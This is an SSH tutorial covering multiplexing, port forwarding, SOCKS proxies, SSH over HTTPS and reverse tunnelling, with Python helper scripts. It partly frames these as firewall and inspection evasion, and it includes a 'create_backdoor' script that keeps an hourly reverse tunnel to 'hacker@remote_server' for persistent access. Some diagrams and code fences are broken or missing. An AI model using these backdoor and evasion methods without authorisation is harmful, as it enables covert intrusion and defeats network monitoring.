## üîÑ `SSH Multiplexing`

> SSH multiplexing: One connection to rule them all!

<details>
<summary><strong>üîç Why Use SSH Multiplexing?</strong></summary>

Imagine you're an administrator managing a cluster of 100 servers. Without multiplexing, each SSH connection would require its own TCP handshake, authentication, and encryption process. This can lead to noticeable delays, especially when executing commands across all servers. SSH multiplexing solves this by creating one master connection that all subsequent SSH sessions can utilize, dramatically reducing overhead and improving responsiveness.

</details>

### üìä Multiplexing Diagram

```mermaid
graph TD
    A[Client] --> B[Master Connection]
    B --> C[SSH 1]
    B --> D[SSH 2]
    B --> E[SSH 3]
```

### üõ†Ô∏è Configuration Example:

```plaintext
ControlMaster auto
ControlPath ~/.ssh/controlmasters/%r@%h:%p
ControlPersist 10m
```

- `ControlMaster auto`: Automatically sets up a master connection if one doesn't exist.
- `ControlPath`: Specifies the path for the socket file used to communicate with the master connection.
- `ControlPersist 10m`: Keeps the master connection open for 10 minutes after the last session closes.

<details>
<summary><strong>üåü Real-World Example</strong></summary>

Consider a scenario where you need to update a configuration file across 50 servers in a Kubernetes cluster. Without multiplexing, you'd need to establish 50 separate SSH connections, each with its own authentication process. With multiplexing, you establish one master connection, and all subsequent connections reuse this existing channel, significantly speeding up the process.

[Screenshot placeholder: Show a side-by-side comparison of network traffic with and without SSH multiplexing, highlighting the reduced number of connections and improved speed.]

</details>

[Screenshot Description: SSH Multiplexing Comparison]

This screenshot displays a side-by-side comparison of network traffic with and without SSH multiplexing. On the left side, you can see multiple SSH connections being established, each requiring its own authentication process. This results in a higher number of network packets and increased latency.

On the right side, with SSH multiplexing enabled, you'll notice a single master connection being established, followed by multiple SSH sessions utilizing this existing channel. The reduced number of connection setups leads to fewer network packets and significantly improved response times.

Key takeaway: SSH multiplexing dramatically reduces connection overhead, resulting in faster and more efficient remote management, especially when dealing with multiple servers or frequent connections.

```python
import subprocess
import time

def ssh_multiplex(action, host):
    control_path = f"~/.ssh/controlmasters/%r@{host}:%p"
    actions = {
        "check": ["ssh", "-O", "check", "-S", control_path, host],
        "stop": ["ssh", "-O", "stop", "-S", control_path, host],
        "start": ["ssh", "-fN", "-M", "-S", control_path, host]
    }
    if action == "check":
        return "Master running" in subprocess.run(actions[action], capture_output=True, text=True).stderr
    subprocess.run(actions[action])

def manage_connections(hosts):
    while True:
        for host in hosts:
            if ssh_multiplex("check", host):
                print(f"Connection to {host} active")
            else:
                print(f"Creating new connection to {host}")
                ssh_multiplex("start", host)
        time.sleep(60)  # Check every minute

# Usage
hosts = ["server1.example.com", "server2.example.com", "server3.example.com"]
manage_connections(hosts)
```

## üîÄ `Advanced Port Forwarding`

> Bend the network to your will with SSH port forwarding!

<details>
<summary><strong>üîç Why Use Port Forwarding?</strong></summary>

Port forwarding enables you to:
1. Access services on remote networks as if they were local
2. Bypass firewalls and network restrictions
3. Secure otherwise insecure protocols by tunneling them through SSH

</details>

### üìä Port Forwarding Diagram

```mermaid
graph LR
    A[Local Client] -->|SSH| B[SSH Server]
    B -->|MySQL| C[Remote MySQL Server]
    A -->|localhost:3306| C
```

### üåê Dynamic Port Forwarding:

```bash
ssh -D 8080 -f -C -q -N hacker@target
```

- `-D 8080`: Sets up a dynamic port forward on local port 8080
- `-f`: Runs in background
- `-C`: Compresses data
- `-q`: Quiet mode
- `-N`: Do not execute remote commands

### üöÄ Multi-Hop Port Forwarding:

```bash
ssh -L 3306:internal_db:3306 -J jumphost hacker@internal_host
```

This command forwards local port 3306 to `internal_db:3306` through `jumphost` and `internal_host`.

[Screenshot placeholder: Diagram showing the flow of traffic through multiple SSH hops, from the local machine to the final destination server.]

[Screenshot Description: Multi-Hop SSH Port Forwarding]

This diagram illustrates the flow of traffic through multiple SSH hops, from the local machine to the final destination server. You'll see three main components:

1. Local Machine: The starting point of the connection.
2. Jump Host: An intermediate server that acts as a gateway.
3. Internal Host: The final destination server, typically in a private network.

The diagram shows how the SSH connection is established from the local machine to the jump host, and then from the jump host to the internal host. Data packets are encapsulated within the SSH tunnel, allowing secure access to resources on the internal network that would otherwise be unreachable from the outside.

Key takeaway: Multi-hop SSH port forwarding enables secure access to resources in complex network environments, bypassing network restrictions and maintaining end-to-end encryption.

### üêç Auto Tunnel Manager:

<details>
<summary><strong>Click to view Python script</strong></summary>

```python
import subprocess
import time
import logging

logging.basicConfig(level=logging.INFO)

tunnels = [
    {"local": 8080, "remote_host": "app_server", "remote_port": 80, "ssh_host": "gateway"},
    {"local": 3306, "remote_host": "db_server", "remote_port": 3306, "ssh_host": "gateway"}
]

def manage_tunnel(t, action):
    cmd = f"ssh -L {t['local']}:{t['remote_host']}:{t['remote_port']} -N -f {t['ssh_host']}"
    if action == "create":
        subprocess.Popen(cmd, shell=True)
    elif action == "check":
        return subprocess.call(f"netstat -tln | grep :{t['local']}", shell=True) == 0

def main():
    while True:
        for t in tunnels:
            if not manage_tunnel(t, "check"):
                logging.info(f"Recreating tunnel: {t['local']} -> {t['remote_host']}:{t['remote_port']}")
                manage_tunnel(t, "create")
        time.sleep(60)

if __name__ == "__main__":
    main()
```

```

### üõ†Ô∏è Setup SOCKS Proxy:

```bash
ssh -D 1080 -f -C -q -N hacker@proxy_server
```

### üöÄ Usage Examples:

- **curl:**
  ```bash
  curl --socks5 localhost:1080 http://secret-site.com
  ```

- **git:**
  ```bash
  git config --global http.proxy socks5://localhost:1080
  ```

[Screenshot placeholder: Terminal window showing the setup of a SOCKS proxy and subsequent usage with curl and git, demonstrating successful access to previously blocked resources.]

[Screenshot Description: SSH as SOCKS Proxy Usage]

This screenshot showcases a terminal window demonstrating the setup of a SOCKS proxy using SSH and its subsequent usage with common tools like curl and git.

You'll see the following steps:

1. Establishing the SSH SOCKS proxy using the command: `ssh -D 1080 -f -C -q -N hacker@proxy_server`
2. Using curl with the SOCKS proxy to access a previously blocked website: `curl --socks5 localhost:1080 http://secret-site.com`
3. Configuring git to use the SOCKS proxy for all connections: `git config --global http.proxy socks5://localhost:1080`

The output shows successful connections and data retrieval, indicating that the SOCKS proxy is working as intended.

Key takeaway: Using SSH as a SOCKS proxy provides a versatile method for bypassing network restrictions, anonymizing traffic, and securing connections on untrusted networks.

## üîå `SSH over HTTPS`

> Hide your SSH in plain sight!

<details>
<summary><strong>üîç Why Use SSH over HTTPS?</strong></summary>

1. Bypass firewalls that block SSH traffic
2. Evade deep packet inspection
3. Access SSH services in restrictive environments
4. Maintain SSH access without arousing suspicion

</details>

### üìä SSH over HTTPS Diagram

```mermaid
graph LR

```

[Screenshot placeholder: Network traffic analysis showing SSH traffic successfully disguised as HTTPS, bypassing firewall restrictions.]

[Screenshot Description: SSH over HTTPS Traffic Analysis]

This screenshot presents a network traffic analysis comparing regular SSH traffic with SSH traffic disguised as HTTPS. The analysis is typically done using a tool like Wireshark.

On the left side, you'll see standard SSH traffic, easily identifiable by its characteristic packet patterns and port usage (usually port 22).

On the right side, you'll observe the same SSH traffic now encapsulated within HTTPS packets. These packets use port 443 and exhibit the typical patterns of HTTPS traffic, making it difficult to distinguish from regular encrypted web traffic.

Key takeaway: By disguising SSH traffic as HTTPS, you can effectively bypass firewalls and network monitoring systems that may block or flag standard SSH connections, allowing for stealthy remote access in restrictive environments.

## üì° `Reverse SSH Tunneling`

> Make the server come to you!

<details>
<summary><strong>üîç Why Use Reverse SSH Tunneling?</strong></summary>

1. Access machines behind NAT or restrictive firewalls
2. Provide remote support without port forwarding
3. Maintain persistent access to remote systems
4. Create backdoors for penetration testing (with proper authorization)

</details>

### üìä Reverse SSH Tunneling Diagram

```

### üõ†Ô∏è Setup Reverse Tunnel:

```bash
ssh -R 9999:localhost:22 hacker@remote_server
```

### üêç Auto Reverse Tunnel:

<details>
<summary><strong>Click to view Python script</strong></summary>

```python
import subprocess
import time
import logging

logging.basicConfig(level=logging.INFO)

def create_backdoor():
    cmd = "ssh -R 9999:localhost:22 -N hacker@remote_server"
    subprocess.Popen(cmd, shell=True)
    logging.info("Reverse SSH tunnel created")

def main():
    while True:
        create_backdoor()
        time.sleep(3600)  # Recreate tunnel every hour

if __name__ == "__main__":
    main()
```

</details>

[Screenshot Description: Reverse SSH Tunneling Diagram] (continued)

3. Remote Client: The machine that will connect to the local machine through the tunnel.

You'll see arrows indicating that the initial connection is made from the local machine to the SSH server, establishing the tunnel. Then, another arrow shows how the remote client connects to the SSH server and accesses the local machine through this established tunnel.

Key takeaway: Reverse SSH tunneling allows you to create a secure pathway into networks that are otherwise inaccessible from the outside, enabling remote access to machines behind firewalls or NAT without requiring port forwarding on the local network.
